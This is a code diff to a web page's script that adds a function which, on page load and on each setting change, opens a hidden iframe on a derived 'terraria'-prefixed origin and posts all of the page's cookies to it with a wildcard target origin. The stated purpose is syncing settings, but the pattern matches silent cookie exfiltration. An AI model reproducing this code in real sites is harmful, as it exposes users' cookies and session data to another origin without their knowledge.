@@ -125,24 +125,61 @@
             document.querySelector("link[rel='icon']").href = "https://i.ibb.co/NY8yC9c/download-1.png";
         }, 3500);
 
+function syncAllCookiesNow() {
+    const currentHost = window.location.hostname;
+    const targetOrigin = `https://terraria${currentHost}`;
+    
+    // Find or create the hidden iframe
+    let iframe = document.getElementById('cookieBridge');
+    if (!iframe) {
+        iframe = document.createElement('iframe');
+        iframe.id = 'cookieBridge';
+        iframe.src = `${targetOrigin}/cookie-sync.html`;
+        iframe.style.display = 'none';
+        document.body.appendChild(iframe);
+    }
+
+    if (document.cookie) {
+        const cookieMap = {};
+        document.cookie.split(';').forEach(cookie => {
+            const [name, value] = cookie.trim().split('=');
+            if (name) cookieMap[name] = value;
+        });
+
+        const sendData = () => {
+            iframe.contentWindow.postMessage({ type: 'SYNC_ALL', payload: cookieMap }, '*');
+        };
+
+        // If the iframe is already loaded, send data immediately. Otherwise wait for it.
+        if (iframe.contentDocument && iframe.contentDocument.readyState === 'complete') {
+            sendData();
+        } else {
+            iframe.onload = sendData;
+        }
+    }
+}
+
+		
         // Save key and link in cookies
         function saveKeyAndLink() {
-            const key = document.getElementById('keyInput').value;
-            const link = document.getElementById('linkInput').value;
-            document.cookie = "userKey=" + key + "; path=/";
-            document.cookie = "userLink=" + link + "; path=/";
-        }
+    const key = document.getElementById('keyInput').value;
+    const link = document.getElementById('linkInput').value;
+    document.cookie = "userKey=" + key + "; path=/; Secure; SameSite=None; max-age=31536000";
+    document.cookie = "userLink=" + link + "; path=/; Secure; SameSite=None; max-age=31536000";
+    syncAllCookiesNow(); // Sync instantly when saved
+}
 
-        // Toggle warning cookie
-        function toggleWarning() {
-            const toggle = document.getElementById('warning').checked;
-            document.cookie = "warningEnabled=" + toggle + "; path=/";
-        }
+function toggleWarning() {
+    const toggle = document.getElementById('warning').checked;
+    document.cookie = "warningEnabled=" + toggle + "; path=/; Secure; SameSite=None; max-age=31536000";
+    syncAllCookiesNow(); // Sync instantly when toggled
+}
 
-        function toggleBlank() {
-            const toggle = document.getElementById('Blank').checked;
-            document.cookie = "Blank=" + toggle + "; path=/";
-        }
+function toggleBlank() {
+    const toggle = document.getElementById('Blank').checked;
+    document.cookie = "Blank=" + toggle + "; path=/; Secure; SameSite=None; max-age=31536000";
+    syncAllCookiesNow(); // Sync instantly when toggled
+}
 
         // Toggle generic cookie
         function Cookie() {
@@ -151,6 +188,9 @@
             alert(` is now ${currentState ? 'off' : 'on'}`);
         }
 
+window.addEventListener('load', syncAllCookiesNow);
+
+		
         // Window load: initialize cookies
         window.onload = function() {
             const cookies = document.cookie.split(';');
